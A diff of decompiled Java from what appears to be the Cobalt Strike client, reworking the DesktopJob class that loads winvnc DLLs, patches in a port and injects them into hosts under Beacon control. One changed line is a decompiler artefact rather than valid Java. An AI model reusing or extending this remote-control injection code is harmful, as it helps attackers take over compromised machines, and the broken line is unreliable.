@@ -65,14 +65,12 @@ public class DesktopJob implements Callback {
       BeaconEntry var5 = DataUtils.getBeacon(this.tasker.getClient().getData(), var1);
       if (var5 == null) {
          this.tasker.error("Could not find Beacon entry (wait for it to checkin)");
+      } else if (this.is64) {
+         this.tasker.getClient().getConnection().call("aggressor.resource", CommonUtils.args("winvnc.x64.dll"), this);
       } else {
-         if (this.is64) {
-            this.tasker.getClient().getConnection().call("aggressor.resource", CommonUtils.args("winvnc.x64.dll"), this);
-         } else {
-            this.tasker.getClient().getConnection().call("aggressor.resource", CommonUtils.args("winvnc.x86.dll"), this);
-         }
-
+         this.tasker.getClient().getConnection().call("aggressor.resource", CommonUtils.args("winvnc.x86.dll"), this);
       }
+
    }
 
    public void spawn(String var1, String var2, boolean var3) {
@@ -89,18 +87,18 @@ public class DesktopJob implements Callback {
          } else {
             this.tasker.getClient().getConnection().call("aggressor.resource", CommonUtils.args("winvnc.x86.dll"), this);
          }
-
       }
+
    }
 
    public byte[] fix(byte[] var1) {
-      String var2 = CommonUtils.pad(this.vport + "", '\u0000', 32);
+      String var2 = CommonUtils.pad(this.vport.makeConcatWithConstants<invokedynamic>(this.vport), '\u0000', 32);
       var1 = CommonUtils.patch(var1, "VNC AAAABBBBCCCC", var2);
       return var1;
    }
 
    public void result(String var1, Object var2) {
-      byte[] var3 = this.fix((byte[])((byte[])var2));
+      byte[] var3 = this.fix((byte[])var2);
       byte[] var4;
       if (this.isInject) {
          if (this.is64) {
